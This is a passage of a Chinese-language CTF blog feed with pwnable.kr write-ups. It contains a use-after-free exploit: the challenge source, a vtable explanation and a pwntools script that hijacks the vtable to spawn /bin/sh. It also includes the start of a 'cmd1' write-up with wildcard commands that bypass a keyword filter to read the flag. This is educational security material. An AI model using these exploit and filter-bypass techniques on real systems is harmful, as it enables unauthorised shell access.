fd[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">pid_t</span> fpid;</span><br><span class="line">        pipe(fd);</span><br><span class="line">        fpid = fork();</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d \n&quot;, fd[0], fd[1]);</span></span><br><span class="line">        <span class="keyword">if</span>(fpid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                perror(<span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(fpid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="comment">//父进程 向管道中写入数据</span></span><br><span class="line">                close(fd[<span class="number">0</span>]);</span><br><span class="line">                write(fd[<span class="number">1</span>], buffer, <span class="built_in">strlen</span>(buffer) + <span class="number">1</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;father process input buffer in pipe success!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(fpid == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="comment">//子进程 从管道中读出数据</span></span><br><span class="line">                close(fd[<span class="number">1</span>]);</span><br><span class="line">                read(fd[<span class="number">0</span>], buffer2, <span class="built_in">strlen</span>(buffer) + <span class="number">1</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;son process output buffer in pipe success!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;the buffer in pipe is %s\n&quot;</span>, buffer2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码的作用位父进程将buffer字符串数据写入管道中，子进程从管道中读入数据到新数组buffer2中</p><p>编译输出后</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210124180113099.png" alt="image-20210124180113099"></p><h4 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h4><p>三种缓冲</p><p>全缓冲，行缓冲，不缓冲</p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h4 id=&quot;read函数&quot;&gt;&lt;a href=&quot;#read函数&quot; class=&quot;headerlink&quot; title=&quot;read函数&quot;&gt;&lt;/a&gt;read函数&lt;/h4&gt;&lt;p&gt;从文件描述符指向的管道口读入指定字节的字符串到指定的数组中</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/ctf/pwn/pwnable-kr/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr uaf</title>
    <link href="http://example.com/32386/"/>
    <id>http://example.com/32386/</id>
    <published>2021-07-14T04:44:16.830Z</published>
    <updated>2022-01-01T09:55:43.884Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210208131805440.png"></p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">        <span class="keyword">int</span> age;</span><br><span class="line">        string name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;My name is &quot;</span> &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;I am &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">Man</span>(string name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::<span class="built_in">introduce</span>();</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;I am a nice guy!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Woman</span>(string name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::<span class="built_in">introduce</span>();</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;I am a cute girl!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        Human* m = <span class="keyword">new</span> <span class="built_in">Man</span>(<span class="string">&quot;Jack&quot;</span>, <span class="number">25</span>);</span><br><span class="line">        Human* w = <span class="keyword">new</span> <span class="built_in">Woman</span>(<span class="string">&quot;Jill&quot;</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">size_t</span> len;</span><br><span class="line">        <span class="keyword">char</span>* data;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;1. use\n2. after\n3. free\n&quot;</span>;</span><br><span class="line">                cin &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">                <span class="built_in"><span class="keyword">switch</span></span>(op)&#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                                m-&gt;<span class="built_in">introduce</span>();</span><br><span class="line">                                w-&gt;<span class="built_in">introduce</span>();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                                len = <span class="built_in">atoi</span>(argv[<span class="number">1</span>]);</span><br><span class="line">                                data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">                                <span class="built_in">read</span>(<span class="built_in">open</span>(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">                                cout &lt;&lt; <span class="string">&quot;your data is allocated&quot;</span> &lt;&lt; endl;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                                <span class="keyword">delete</span> m;</span><br><span class="line">                                <span class="keyword">delete</span> w;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Ues-After-Free"><a href="#Ues-After-Free" class="headerlink" title="Ues After Free"></a>Ues After Free</h3><p>​        uaf的原理其实并不难懂，首先需要一个迷途指针，也称为野指针，这个指针时因为在使用玩分配的堆空间后没有将指向堆的指针制空造成的，利用野指针我们可以向这块堆中写入一些东西，然后在申请堆空间，在释放完后马上又申请会申请到那段刚刚释放的堆空间。</p><p>这个是最简单的uaf程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p0;</span><br><span class="line">    p0=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>);   <span class="comment">//指针p0申请内存；</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p0,<span class="string">&quot;hello&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p0 Addr:%x,%s\n&quot;</span>,p0,p0);      <span class="comment">//打印其地址与值；</span></span><br><span class="line">    <span class="built_in">free</span>(p0);                             <span class="comment">//释放p0；</span></span><br><span class="line">    <span class="keyword">char</span> *p1;</span><br><span class="line">    p1==(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(p1,<span class="string">&quot;word&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1 Addr:%x,%s\n&quot;</span>,p1,p0);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="C-的一些知识点"><a href="#C-的一些知识点" class="headerlink" title="C++的一些知识点"></a>C++的一些知识点</h3><h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a><a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E5%9E%8B_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6)">多态</a></h4><p>​        这个概念在在wiki上解释得非常抽象，但是上面的源码其实挺适合我们理解的，Man和Woman都继承了Person这个类，introduce这个动作是所有人都有的，但是细分到Man和Woman时他们之间的introduce又不一样了，这就是多态。</p><p>​        我的理解为，在于参考系的不同，这样就存在宏观与微观的区别。。怪异的理解。</p><h4 id="虚表"><a href="#虚表" class="headerlink" title="虚表"></a>虚表</h4><p>​        c++面向对象编程的多态性需要由虚表来实现。</p><p>​        虚表通俗来讲就是一个函数指针数组，这个数组里面的指针指向了类中的虚函数，<strong>但是虚函数表并不存放在类中</strong>，类中只有一个指针指向虚函数表。而在c++中同一个类的对象共用一张虚表。        </p><h4 id="类在内存中的结构"><a href="#类在内存中的结构" class="headerlink" title="类在内存中的结构"></a>类在内存中的结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+------------------------+           virtual talbe                                           </span><br><span class="line">+  virtual table pointer +  ----&gt;  +---------------+ </span><br><span class="line">+------------------------+         + func1 pointer +    </span><br><span class="line">+   characteristic _ 1   +         + --------------+</span><br><span class="line">+------------------------+         + func2 pointer +</span><br><span class="line">+   characteristic _ 2   +         +---------------+</span><br><span class="line">+------------------------+         + func3 pointer +</span><br><span class="line">+   characteristic _ 3   +         +---------------+</span><br><span class="line">+------------------------+</span><br><span class="line">+       ...........      +</span><br><span class="line">+------------------------+</span><br><span class="line">+   characteristic _ n   +</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure><h3 id="程序分析分析"><a href="#程序分析分析" class="headerlink" title="程序分析分析"></a>程序分析分析</h3><ul><li><p>程序开始申请了两块内存</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Human* m = <span class="keyword">new</span> <span class="built_in">Man</span>(<span class="string">&quot;Jack&quot;</span>, <span class="number">25</span>);</span><br><span class="line">Human* w = <span class="keyword">new</span> <span class="built_in">Woman</span>(<span class="string">&quot;Jill&quot;</span>, <span class="number">21</span>);</span><br></pre></td></tr></table></figure></li><li><p>用户选择菜单（1.调用方法。2.申请内存，读入参数。3.释放内存）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in"><span class="keyword">switch</span></span>(op)&#123;</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                               m-&gt;<span class="built_in">introduce</span>();</span><br><span class="line">                               w-&gt;<span class="built_in">introduce</span>();</span><br><span class="line">                               <span class="keyword">break</span>;</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                               len = <span class="built_in">atoi</span>(argv[<span class="number">1</span>]);</span><br><span class="line">                               data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">                               <span class="built_in">read</span>(<span class="built_in">open</span>(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">                               cout &lt;&lt; <span class="string">&quot;your data is allocated&quot;</span> &lt;&lt; endl;</span><br><span class="line">                               <span class="keyword">break</span>;</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                               <span class="keyword">delete</span> m;</span><br><span class="line">                               <span class="keyword">delete</span> w;</span><br><span class="line">                               <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现程序没有对释放内存后的指针置空，存在野指针，而选择而又可以申请内存，满足UAF漏洞的触发条件。初步的想法就是先3在2（先释放后申请），在向申请的空间中写入东西，现在的问题是写什么进去。释放的空间是类，写入的数据改变的是类，如果类有虚函数，那么类结构的开头就是虚表指针。我们改变的就是虚表指针，改变虚表指针的作用可以通过IDA查看反编译代码来学习</p></li></ul><h4 id="IDA反编译来理解虚函数表"><a href="#IDA反编译来理解虚函数表" class="headerlink" title="IDA反编译来理解虚函数表"></a>IDA反编译来理解虚函数表</h4><p>跟踪变量v12和v13</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210205174523338.png"></p><p>下面这里有点难看懂，如指针没有学好看这种一定会看晕。我尽量写清楚一点</p><p>首先要明白v12,v13这两个变量存放的是对象虚表的地址，因为两个变量类型和操作方法一样，我只说v12就可以了</p><ol><li>将v12强转成QWORD*类型，在取这个地址中的值，QWORD占8个字节，一次取8位，取出的这8位就是虚表的首地址</li><li>虚表首地址加+8，代表取虚表中的第二个函数指针</li><li>将函数指针赋值，在调用，参数就是对象本身（this指针)，如果不懂this指针去Google了解下，很重要。</li></ol><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210205174708424.png"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>​        通过上面的分析，知道了调用虚函数其实是通过偏移来实现的，通过+8可以调用第二个虚函数，如果我们得到了虚函数表基址，并且改变，就可以控制函数调用我们想调用的虚函数，而程序为我们准备了这样一个虚函数，我们可以使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过IDA查找到Person函数的虚表地址是0x0000000000401590，将这个值-8，那么在调用的时候就刚好可以调用到give_shell这个函数</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210205180240856.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本机exp，远程失败好像是我没有写文件的权限？</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">vtable_addr = <span class="number">0x0000000000401550</span></span><br><span class="line">filepath = <span class="string">&#x27;/home/fish/uaf/bash&#x27;</span></span><br><span class="line"><span class="comment">#filepath = &#x27;/tmp/f1sh&#x27;</span></span><br><span class="line">write_stream = p64(vtable_addr - <span class="number">8</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(write_stream)</span><br><span class="line"></span><br><span class="line">Argv = [<span class="string">&#x27;/home/uaf/uaf&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, filepath]</span><br><span class="line">p = process(executable = <span class="string">&#x27;./uaf&#x27;</span>, argv = Argv )</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这个是链接上服务器后手动getshell得到的结果</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210205224956747.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210208131805440.png&quot;&gt;&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/ctf/pwn/pwnable-kr/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr cmd1 cmd2</title>
    <link href="http://example.com/46930/"/>
    <id>http://example.com/46930/</id>
    <published>2021-07-14T04:44:16.830Z</published>
    <updated>2022-01-01T09:54:40.633Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h3><p><a href="http://c.biancheng.net/view/5876.html">linuxPATH入门教学</a><br><a href="https://blog.csdn.net/qq_16334327/article/details/96591949">linux命令通配符</a><br><a href="https://blog.csdn.net/shisiye15/article/details/7846557">putenv函数讲解</a></p><p>这道题考察的是对于linux中shell的操作，还有PATH环境知识的理解。我参考了上面三篇文章，都写得很不错👍。这里我写两种解决方法</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210201203616211.png"></p><h4 id="method-1"><a href="#method-1" class="headerlink" title="method 1"></a>method 1</h4><p>首先ssh登录，查看源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;sh&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;tmp&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">        putenv(<span class="string">&quot;PATH=/thankyouverymuch&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,getenv(<span class="string">&quot;PATH&quot;</span>));</span><br><span class="line">        system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        system( argv[<span class="number">1</span>] );</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序将PATH环境设置成了一个不存在的路径导致不能直接使用命令，而且filter函数过滤掉了我们输入的一些字符。</p><p>这里我们可以先来测试一下PATH如果被改变会怎么样，下面贴测试代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>**argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//打印改变前的PATH，并且使用命令</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;before PATH: %s\n&quot;</span>,getenv(<span class="string">&quot;PATH&quot;</span>));</span><br><span class="line">        system(argv[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//改变PATH，将其设置成一个不存在的路径</span></span><br><span class="line">        putenv(<span class="string">&quot;PATH=/aaa&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//再次打印路径</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;after PATH: %s\n&quot;</span>, getenv(<span class="string">&quot;PATH&quot;</span>));</span><br><span class="line">        system(argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后运行，这里我们测试的命令是 <strong>ls</strong> ，可以发现ls命令已经失效了，由于PATH的路径被临时改变，需要使用ls命令的绝对路径 <strong>/bin/ls</strong></p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210201204940643.png"></p><p>再次测试，使用命令的绝对路径 <strong>/bin/ls</strong>，可以发现又可以正常运行了</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210201205043930.png"></p><p>所以这道题我们需要输入<strong>cat</strong>命令的绝对路径 <strong>/bin/cat</strong>，但是问题又来了，flag这个词被过滤掉了，这就需要使用到统配符了，我们可以使用 <strong>“/bin/cat f*“</strong> 或者 <strong>“/bin/cat fla?”</strong> 等命令来实现查看flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./cmd1 &#x27;/bin/cat fla?&#x27;</span><br><span class="line">./cmd1 &#x27;/bin/cat f*&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210201205526147.png"></p><p><em>mommy now I get what PATH environment is for :)</em></p><h4 id="method-2"><a href="#method-2" class="headerlink" title="method 2"></a>method 2</h4><p>第二种方法是我们采用shell编程方式，先创建一个文件，在利用程序打开我们的文件，在文件中，我们可以使用任意字符而不受限制</p><ul><li><p>首先现在服务器的/tmp/目录下创建一个我们自己使用的目录，然后在目录中创建我们的文件，一会儿需要用程序来调用</p><p><img 